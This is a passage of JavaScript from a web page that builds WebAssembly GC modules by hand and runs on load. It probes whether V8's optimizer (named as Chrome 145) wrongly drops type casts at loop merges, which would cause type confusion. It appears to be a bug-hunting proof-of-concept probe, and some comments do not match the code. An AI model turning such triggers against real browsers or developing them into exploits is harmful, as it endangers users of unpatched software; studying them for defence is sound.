// =========================================================================
// Wasm Binary Builder Utilities

function uleb128(value) {
  const result = [];
  if (value < 0) value = value >>> 0;
  do {
    let byte = value & 0x7F;
    value >>>= 7;
    if (value !== 0) byte |= 0x80;
    result.push(byte);
  } while (value !== 0);
  return result;
}

function sleb128(value) {
  const result = [];
  while (true) {
    let byte = value & 0x7F;
    value >>= 7;
    if ((value === 0 && (byte & 0x40) === 0) ||
        (value === -1 && (byte & 0x40) !== 0)) {
      result.push(byte);
      break;
    }
    result.push(byte | 0x80);
  }
  return result;
}

// Encode a 64-bit unsigned LEB128 from two 32-bit halves
function uleb128_64(lo, hi) {
  // Combine to BigInt for safe 64-bit LEB128
  const val = (BigInt(hi >>> 0) << 32n) | BigInt(lo >>> 0);
  const result = [];
  let v = val;
  do {
    let byte = Number(v & 0x7Fn);
    v >>= 7n;
    if (v !== 0n) byte |= 0x80;
    result.push(byte);
  } while (v !== 0n);
  return result;
}

function f64Bytes(value) {
  const buf = new ArrayBuffer(8);
  new Float64Array(buf)[0] = value;
  return Array.from(new Uint8Array(buf));
}

function f32Bytes(value) {
  const buf = new ArrayBuffer(4);
  new Float32Array(buf)[0] = value;
  return Array.from(new Uint8Array(buf));
}

function encodeString(str) {
  const bytes = new TextEncoder().encode(str);
  return [...uleb128(bytes.length), ...bytes];
}

function makeSection(id, content) {
  return [id, ...uleb128(content.length), ...content];
}

// =========================================================================
// Test 1: Type Confusion via Loop Phi with Exception Paths
// =========================================================================
async function testPhiTypeConfusion() {
  log('=== Test 1: Type Confusion via Loop Phi + Exception Path ===');
  log('Theory: Loop Phi merges TypeA from normal path and TypeB from exception');
  log('handler. If TypeB path is bottom-typed, Phi narrows to TypeA only.');
  log('ref.cast to TypeA eliminated → struct.get reads TypeB layout as TypeA.');

  try {
    // Module structure:
    // Type 0: struct $TypeA { i32 (sentinel=0x41414141), i64 }
    // Type 1: struct $TypeB { f64 (= reinterpret of 0xDEADBEEFCAFEBABE), i32 }
    // Type 2: func () -> (ref null eq)   [factory signature]
    // Type 3: func (i32) -> i32          [test function signature]
    // Type 4: tag type: func () -> ()    [exception tag]

    // -- TYPE SECTION --
    const typeSection = [
      0x01, // 1 rec group
      REC_GROUP,
      0x05, // 5 types in rec group

      // Type 0: struct $TypeA { mut i32, mut i64 }
      0x5F, // struct
      0x02, // 2 fields
      TYPE.I32, 0x01, // field 0: mutable i32
      TYPE.I64, 0x01, // field 1: mutable i64

      // Type 1: struct $TypeB { mut f64, mut i32 }
      0x5F, // struct
      0x02, // 2 fields
      TYPE.F64, 0x01, // field 0: mutable f64
      TYPE.I32, 0x01, // field 1: mutable i32

      // Type 2: func () -> (ref null eq) [factory]
      FUNC_TYPE,
      0x00, // 0 params
      0x01, // 1 result
      TYPE.EQREF, // eqref

      // Type 3: func (i32) -> i32 [test function]
      FUNC_TYPE,
      0x01, TYPE.I32, // 1 param: i32
      0x01, TYPE.I32, // 1 result: i32

      // Type 4: func () -> () [tag type]
      FUNC_TYPE,
      0x00, // 0 params
      0x00, // 0 results
    ];

    // -- TAG SECTION (id=13) --
    // Exception tag with type 4
    const tagSection = [
      0x01, // 1 tag
      0x00, // attribute: exception
      0x04, // type index 4
    ];

    // -- FUNCTION SECTION --
    const funcSection = [
      0x04, // 4 functions
      0x02, // func 0: make_type_a (type 2)
      0x02, // func 1: make_type_b (type 2)
      0x03, // func 2: test_phi_confusion (type 3)
      0x03, // func 3: test_direct (type 3)
    ];

    // -- TABLE SECTION --
    const tableSection = [
      0x01,      // 1 table
      TYPE.FUNCREF, // funcref
      0x00,      // limits: no max
      0x04,      // min: 4
    ];

    // -- EXPORT SECTION --
    const exportSection = [
      0x02, // 2 exports
      ...encodeString('test_phi'), 0x00, 0x02, // func 2
      ...encodeString('test_direct'), 0x00, 0x03, // func 3
    ];

    // -- ELEMENT SECTION --
    // Initialize table with functions
    const elemSection = [
      0x01, // 1 element segment
      0x00, // flags: active, table 0, offset follows
      OP.I32_CONST, 0x00, OP.END, // offset = 0
      0x04, // 4 function indices
      0x00, 0x01, 0x02, 0x03,
    ];

    // -- CODE SECTION --
    // Function 0: make_type_a -> (ref null eq)
    // Creates struct $TypeA with sentinel value 0x41414141 in field 0
    const func0Body = [
      0x00, // 0 locals
      // struct.new $TypeA(i32.const 0x41414141, i64.const 0x4242424242424242)
      OP.I32_CONST, ...sleb128(0x41414141),
      OP.I64_CONST, ...sleb128(0x42424242), // simplified - low bits
      OP.GC_PREFIX, OP.STRUCT_NEW, ...uleb128(0), // struct.new $TypeA (type 0)
      OP.END,
    ];

    // Function 1: make_type_b -> (ref null eq)
    // Creates struct $TypeB with f64 = 3.14159... and i32 = 0xBBBBBBBB
    const func1Body = [
      0x00, // 0 locals
      // struct.new $TypeB(f64.const 3.141592653589793, i32.const 0xBBBBBBBB)
      OP.F64_CONST, ...f64Bytes(3.141592653589793),
      OP.I32_CONST, ...sleb128(-1145324613), // 0xBBBBBBBB as signed
      OP.GC_PREFIX, OP.STRUCT_NEW, ...uleb128(1), // struct.new $TypeB (type 1)
      OP.END,
    ];

    // Function 2: test_phi_confusion(iterations: i32) -> i32
    // This function creates a loop where:
    //   - Normal path: creates TypeA objects
    //   - Exception path: creates TypeB objects (via try/catch)
    //   - After loop: ref.cast to TypeA should NOT be eliminated
    //   - If eliminated: struct.get reads TypeB's f64 as i32 → wrong value
    const func2Body = [
      // Locals: 1 local of type (ref null eq)
      0x01, // 1 local declaration
      0x01, // count
      TYPE.EQREF, // type: eqref (ref null eq)

      // local 0 = param (i32 iterations)
      // local 1 = $obj (ref null eq)

      // Initialize $obj with TypeA
      OP.CALL, ...uleb128(0), // call make_type_a
      OP.LOCAL_SET, ...uleb128(1), // local.set $obj

      // block $exit
      OP.BLOCK, 0x40, // block void
        // loop $loop
        OP.LOOP, 0x40, // loop void

          // Check: if iterations == 0, break
          OP.LOCAL_GET, ...uleb128(0), // get iterations
          OP.I32_EQZ,
          OP.BR_IF, ...uleb128(1), // br_if $exit (depth 1)

          // Decrement iterations
          OP.LOCAL_GET, ...uleb128(0),
          OP.I32_CONST, 0x01,
          OP.I32_SUB,
          OP.LOCAL_SET, ...uleb128(0),

          // Key pattern: On odd iterations, try to create TypeB via
          // exception path to confuse the type analyzer.
          // On even iterations, create TypeA normally.
          OP.LOCAL_GET, ...uleb128(0),
          OP.I32_CONST, 0x01,
          OP.I32_AND,

          OP.IF, 0x40, // if (iterations & 1)
            // Odd: try block - throw and catch, creating TypeB in catch
            OP.TRY, 0x40, // try void
              // Throw an exception
              OP.THROW, ...uleb128(0), // throw tag 0
            OP.CATCH, ...uleb128(0), // catch tag 0
              // In catch handler: create TypeB
              // The type analyzer may consider this path as unlikely/unreachable
              // after the Phi type from the forward edge is TypeA
              OP.CALL, ...uleb128(1), // call make_type_b
              OP.LOCAL_SET, ...uleb128(1), // local.set $obj <- TypeB!
            OP.END, // end try/catch
          OP.ELSE,
            // Even: create TypeA normally
            OP.CALL, ...uleb128(0), // call make_type_a
            OP.LOCAL_SET, ...uleb128(1), // local.set $obj <- TypeA
          OP.END, // end if

          OP.BR, ...uleb128(0), // br $loop
        OP.END, // end loop
      OP.END, // end block

      // After loop: $obj holds either TypeA or TypeB
      // Attempt ref.test then ref.cast
      // If the optimizer eliminated the cast, struct.get on TypeB reads garbage

      OP.LOCAL_GET, ...uleb128(1), // get $obj
      OP.REF_IS_NULL,
      OP.IF, TYPE.I32, // if null
        OP.I32_CONST, ...sleb128(-1), // return -1 for null
      OP.ELSE,
        // ref.test (ref $TypeA)
        OP.LOCAL_GET, ...uleb128(1),
        OP.GC_PREFIX, OP.REF_TEST, ...uleb128(0), // ref.test (ref $TypeA)

        OP.IF, TYPE.I32,
          // Passed ref.test: should be TypeA
          // ref.cast and struct.get
          OP.LOCAL_GET, ...uleb128(1),
          OP.GC_PREFIX, OP.REF_CAST, ...uleb128(0), // ref.cast (ref $TypeA)
          OP.GC_PREFIX, OP.STRUCT_GET, ...uleb128(0), ...uleb128(0), // struct.get $TypeA field 0
        OP.ELSE,
          // Failed ref.test: it's TypeB - read its field 1 (i32)
          OP.LOCAL_GET, ...uleb128(1),
          OP.GC_PREFIX, OP.REF_CAST, ...uleb128(1), // ref.cast (ref $TypeB)
          OP.GC_PREFIX, OP.STRUCT_GET, ...uleb128(1), ...uleb128(1), // struct.get $TypeB field 1
        OP.END,
      OP.END,

      OP.END, // end function
    ];

    // Function 3: test_direct(iterations: i32) -> i32
    // Direct comparison baseline - always creates TypeA, reads field 0
    const func3Body = [
      0x01, // 1 local declaration
      0x01, TYPE.EQREF,

      // local 0 = param, local 1 = $obj

      OP.CALL, ...uleb128(0), // make_type_a
      OP.LOCAL_SET, ...uleb128(1),

      OP.BLOCK, 0x40,
        OP.LOOP, 0x40,
          OP.LOCAL_GET, ...uleb128(0),
          OP.I32_EQZ,
          OP.BR_IF, ...uleb128(1),

          OP.LOCAL_GET, ...uleb128(0),
          OP.I32_CONST, 0x01,
          OP.I32_SUB,
          OP.LOCAL_SET, ...uleb128(0),

          // Always create TypeA
          OP.CALL, ...uleb128(0),
          OP.LOCAL_SET, ...uleb128(1),

          OP.BR, ...uleb128(0),
        OP.END,
      OP.END,

      // Read TypeA field 0
      OP.LOCAL_GET, ...uleb128(1),
      OP.GC_PREFIX, OP.REF_CAST, ...uleb128(0), // ref.cast (ref $TypeA)
      OP.GC_PREFIX, OP.STRUCT_GET, ...uleb128(0), ...uleb128(0), // struct.get $TypeA 0
      OP.END,
    ];

    // Build code section bodies
    function encodeBody(body) {
      return [...uleb128(body.length), ...body];
    }

    const codeBodies = [
      ...encodeBody(func0Body),
      ...encodeBody(func1Body),
      ...encodeBody(func2Body),
      ...encodeBody(func3Body),
    ];

    const codeSection = [0x04, ...codeBodies]; // 4 function bodies

    // Assemble module
    const moduleBytes = [
      ...WASM_HEADER,
      ...makeSection(SEC.TYPE, typeSection),
      ...makeSection(SEC.FUNCTION, funcSection),
      ...makeSection(SEC.TABLE, tableSection),
      ...makeSection(SEC.TAG, tagSection),
      ...makeSection(SEC.EXPORT, exportSection),
      ...makeSection(SEC.ELEMENT, elemSection),
      ...makeSection(SEC.CODE, codeSection),
    ];

    const wasmModule = new Uint8Array(moduleBytes);
    log(`Module built: ${wasmModule.length} bytes`);

    // Compile and instantiate
    const module = await WebAssembly.compile(wasmModule);
    const instance = await WebAssembly.instantiate(module);
    log('Module compiled and instantiated successfully');

    const { test_phi, test_direct } = instance.exports;

    // Sentinel value: TypeA field 0 = 0x41414141 = 1094795585
    // TypeB field 1 (i32) = 0xBBBBBBBB = -1145324613 (signed)
    const SENTINEL_A = 0x41414141;
    const SENTINEL_B = -1145324613;

    // Test at various iteration counts to trigger different optimization tiers
    const iterCounts = [1, 10, 100, 1000, 5000, 10000, 50000, 100000];
    let suspicious = 0;

    for (const iters of iterCounts) {
      try {
        const result = test_phi(iters);
        const directResult = test_direct(iters);

        // For odd final iteration: result should be SENTINEL_B (TypeB)
        // For even final iteration: result should be SENTINEL_A (TypeA)
        const expectA = (iters % 2 === 0);
        const expected = expectA ? SENTINEL_A : SENTINEL_B;

        const isCorrect = (result === expected || result === SENTINEL_A || result === SENTINEL_B);

        if (result !== SENTINEL_A && result !== SENTINEL_B && result !== -1) {
          log(`ITERATIONS=${iters}: result=${result} (0x${(result>>>0).toString(16)}) ` +
              `- UNEXPECTED VALUE! Not TypeA(0x41414141) or TypeB(0xBBBBBBBB)`,
              'VULNERABLE');
          suspicious += 10;
        } else if (!isCorrect) {
          log(`ITERATIONS=${iters}: result=${result} (0x${(result>>>0).toString(16)}) ` +
              `expected=${expected} - TYPE CONFUSION DETECTED`, 'VULNERABLE');
          suspicious += 10;
        } else {
          log(`ITERATIONS=${iters}: result=${result} (0x${(result>>>0).toString(16)}) ` +
              `direct=${directResult} - OK`, 'SAFE');
        }
      } catch (e) {
        log(`ITERATIONS=${iters}: Exception: ${e.message}`, 'SUSPICIOUS');
        suspicious++;
      }
    }

    // Additional test: rapid alternation to stress the JIT
    log('--- Stress test: rapid alternation ---');
    for (let trial = 0; trial < 20; trial++) {
      try {
        const oddResult = test_phi(2 * trial + 1);
        const evenResult = test_phi(2 * trial + 2);

        if (oddResult !== SENTINEL_B && oddResult !== SENTINEL_A && oddResult !== -1) {
          log(`Trial ${trial} odd: UNEXPECTED ${oddResult} (0x${(oddResult>>>0).toString(16)})`,
              'VULNERABLE');
          suspicious += 10;
        }
        if (evenResult !== SENTINEL_A && evenResult !== -1) {
          log(`Trial ${trial} even: UNEXPECTED ${evenResult} (0x${(evenResult>>>0).toString(16)})`,
              'SUSPICIOUS');
          suspicious++;
        }
      } catch (e) {
        // Trapping is expected behavior for some patterns
      }
    }

    if (suspicious >= 10) {
      log('VERDICT: VULNERABLE - Type confusion detected via Phi bottom-type elision', 'VULNERABLE');
    } else if (suspicious > 0) {
      log('VERDICT: SUSPICIOUS - Unexpected behavior observed, may indicate partial exploitation', 'SUSPICIOUS');
    } else {
      log('VERDICT: SAFE - No type confusion detected at this optimization level', 'SAFE');
    }

  } catch (e) {
    log(`Module build/compile error: ${e.message}`, 'ERROR');
    log(`Stack: ${e.stack}`, 'ERROR');
    if (e.message.includes('not supported') || e.message.includes('enable')) {
      log('WasmGC may not be enabled. Try: --enable-features=WebAssemblyGC', 'INFO');
    }
  }
}

// =========================================================================
// Test 2: Indirect Call Polymorphism Phi Confusion
// =========================================================================
async function testIndirectCallPhi() {
  log('');
  log('=== Test 2: Indirect Call Polymorphism + Phi Confusion ===');
  log('Theory: Indirect calls return polymorphic types. At Phi merge,');
  log('type analyzer may narrow based on call_indirect signature rather');
  log('than actual runtime types, leading to cast elimination.');

  try {
    // Simpler module: two factories returning different struct types,
    // called indirectly. The Phi at the merge sees both return types.
    // We test if the JIT incorrectly narrows the Phi.

    const typeSection = [
      0x01, REC_GROUP, 0x04, // 1 rec group, 4 types

      // Type 0: struct $SmallStruct { mut i32 }
      0x5F, 0x01,
      TYPE.I32, 0x01,

      // Type 1: struct $BigStruct { mut i32, mut i64, mut f64 }
      0x5F, 0x03,
      TYPE.I32, 0x01,
      TYPE.I64, 0x01,
      TYPE.F64, 0x01,

      // Type 2: func (i32) -> eqref [factory sig]
      FUNC_TYPE, 0x01, TYPE.I32, 0x01, TYPE.EQREF,

      // Type 3: func (i32, i32) -> i32 [test sig]
      FUNC_TYPE, 0x02, TYPE.I32, TYPE.I32, 0x01, TYPE.I32,
    ];

    const funcSection = [
      0x03, // 3 functions
      0x02, // func 0: factory (type 2)
      0x02, // func 1: factory2 (type 2)
      0x03, // func 2: test_indirect_phi (type 3)
    ];

    const tableSection = [
      0x01, TYPE.FUNCREF, 0x00, 0x04,
    ];

    const exportSection = [
      0x01,
      ...encodeString('test'), 0x00, 0x02,
    ];

    const elemSection = [
      0x01,
      0x00,
      OP.I32_CONST, 0x00, OP.END,
      0x03, 0x00, 0x01, 0x02,
    ];

    // func 0: factory(which: i32) -> eqref
    // if which == 0: return SmallStruct(0xAAAAAAAA)
    // else: return BigStruct(0xBBBBBBBB, 0x..., 0.0)
    const func0Body = [
      0x00,
      OP.LOCAL_GET, 0x00,
      OP.I32_EQZ,
      OP.IF, TYPE.EQREF,
        OP.I32_CONST, ...sleb128(0x55555555),
        OP.GC_PREFIX, OP.STRUCT_NEW, 0x00,
      OP.ELSE,
        OP.I32_CONST, ...sleb128(0x55555555),
        OP.I64_CONST, ...sleb128(0),
        OP.F64_CONST, ...f64Bytes(0.0),
        OP.GC_PREFIX, OP.STRUCT_NEW, 0x01,
      OP.END,
      OP.END,
    ];

    // func 1: factory2(which: i32) -> eqref - always returns BigStruct
    const func1Body = [
      0x00,
      OP.I32_CONST, ...sleb128(-559038737), // 0xDEADBEEF
      OP.I64_CONST, ...sleb128(-1),
      OP.F64_CONST, ...f64Bytes(2.718281828),
      OP.GC_PREFIX, OP.STRUCT_NEW, 0x01,
      OP.END,
    ];

    // func 2: test_indirect_phi(iters: i32, which_factory: i32) -> i32
    // Calls factory indirectly via table, collects result, tests type
    const func2Body = [
      0x01, 0x01, TYPE.EQREF, // 1 local: eqref

      // local 0 = iters, local 1 = which_factory, local 2 = $obj

      // Initialize
      OP.LOCAL_GET, 0x01, // which_factory
      OP.CALL, 0x00,      // call factory
      OP.LOCAL_SET, 0x02,

      OP.BLOCK, 0x40,
        OP.LOOP, 0x40,
          OP.LOCAL_GET, 0x00,
          OP.I32_EQZ,
          OP.BR_IF, 0x01,

          OP.LOCAL_GET, 0x00,
          OP.I32_CONST, 0x01,
          OP.I32_SUB,
          OP.LOCAL_SET, 0x00,

          // Call factory via indirect call (table index = which_factory)
          OP.LOCAL_GET, 0x00, // pass current iter as param
          OP.LOCAL_GET, 0x01,
          OP.CALL_INDIRECT, 0x02, 0x00, // call_indirect type=2 table=0

          OP.LOCAL_SET, 0x02,

          OP.BR, 0x00,
        OP.END,
      OP.END,

      // Check type and read field 0 (i32) - common to both struct types
      OP.LOCAL_GET, 0x02,
      OP.REF_IS_NULL,
      OP.IF, TYPE.I32,
        OP.I32_CONST, ...sleb128(-1),
      OP.ELSE,
        // Try as SmallStruct first
        OP.LOCAL_GET, 0x02,
        OP.GC_PREFIX, OP.REF_TEST, 0x00,
        OP.IF, TYPE.I32,
          OP.LOCAL_GET, 0x02,
          OP.GC_PREFIX, OP.REF_CAST, 0x00,
          OP.GC_PREFIX, OP.STRUCT_GET, 0x00, 0x00,
        OP.ELSE,
          // Try as BigStruct
          OP.LOCAL_GET, 0x02,
          OP.GC_PREFIX, OP.REF_CAST, 0x01,
          OP.GC_PREFIX, OP.STRUCT_GET, 0x01, 0x00,
        OP.END,
      OP.END,

      OP.END,
    ];

    function encodeBody(body) {
      return [...uleb128(body.length), ...body];
    }

    const codeSection = [
      0x03,
      ...encodeBody(func0Body),
      ...encodeBody(func1Body),
      ...encodeBody(func2Body),
    ];

    const moduleBytes = [
      ...WASM_HEADER,
      ...makeSection(SEC.TYPE, typeSection),
      ...makeSection(SEC.FUNCTION, funcSection),
      ...makeSection(SEC.TABLE, tableSection),
      ...makeSection(SEC.EXPORT, exportSection),
      ...makeSection(SEC.ELEMENT, elemSection),
      ...makeSection(SEC.CODE, codeSection),
    ];

    const wasmBytes = new Uint8Array(moduleBytes);
    log(`Module built: ${wasmBytes.length} bytes`);

    const module = await WebAssembly.compile(wasmBytes);
    const instance = await WebAssembly.instantiate(module);
    log('Compiled successfully');

    const { test } = instance.exports;

    const iterCounts = [10, 100, 1000, 10000, 100000];
    let suspicious = 0;

    for (const iters of iterCounts) {
      try {
        const r0 = test(iters, 0); // factory 0 (SmallStruct or BigStruct)
        const r1 = test(iters, 1); // factory 1 (always BigStruct)

        // Expected: field 0 is always 0x55555555 from factory0, 0xDEADBEEF from factory1
        const expected1 = -559038737; // 0xDEADBEEF as signed i32

        if (r1 !== expected1 && r1 !== 0x55555555) {
          log(`iters=${iters} factory1: got ${r1} (0x${(r1>>>0).toString(16)}) ` +
              `expected 0xDEADBEEF - POSSIBLE TYPE CONFUSION`, 'SUSPICIOUS');
          suspicious++;
        } else {
          log(`iters=${iters}: factory0=${r0}(0x${(r0>>>0).toString(16)}) ` +
              `factory1=${r1}(0x${(r1>>>0).toString(16)}) - OK`, 'SAFE');
        }
      } catch (e) {
        log(`iters=${iters}: ${e.message}`, 'SUSPICIOUS');
        suspicious++;
      }
    }

    log(suspicious > 0
      ? `VERDICT: SUSPICIOUS (${suspicious} anomalies)`
      : 'VERDICT: SAFE - Indirect call Phi types correct', suspicious > 0 ? 'SUSPICIOUS' : 'SAFE');

  } catch (e) {
    log(`Error: ${e.message}`, 'ERROR');
    log(`Stack: ${e.stack}`, 'ERROR');
  }
}

// =========================================================================
// Main
// =========================================================================
async function runAllTests() {
  resultsDiv.innerHTML = '';
  log('WasmGC Type Confusion via Phi Bottom-Type Elision');
  log(`Target: V8 14.7.0 / Chrome 145.0.7632.116`);
  log(`User-Agent: ${navigator.userAgent}`);
  log(`Date: ${new Date().toISOString()}`);
  log('');

  await testPhiTypeConfusion();
  await testIndirectCallPhi();

  log('');
  log('All tests complete.');
}

// Auto-run on load
window.addEventListener('load', () => setTimeout(runAllTests, 500));
</script>
